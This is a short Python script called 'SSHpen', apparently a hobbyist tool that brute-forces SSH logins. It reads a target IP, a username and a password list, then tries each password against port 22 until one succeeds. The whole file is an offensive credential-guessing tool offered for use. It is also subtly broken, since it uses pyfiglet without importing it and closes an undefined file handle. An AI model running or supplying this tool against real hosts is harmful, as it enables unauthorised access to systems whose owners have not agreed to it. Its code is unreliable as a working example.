import paramiko,sys,os

ascii_banner = pyfiglet.figlet_format("Welcome  to: \n SSHpen \nSSH   brute   forcing  \nWritten   by   :\nGreatOverlordX")
print(ascii_banner)


target = str(input('Do enter target IP address: '))
username = str(input('Do enter username to bruteforce: '))
password_file = str(input('Enter password file location here: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(target, port=22, username=username, password=password)        
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)
        
            if response == 0:
                print('PASSWORD FOUND!: '+ password)
                sys.exit()
            elif response == 1:
                print('Oopsie! No luckie! LOL')
        except Exception as e:
            print(e)
        pass

input_file.close()
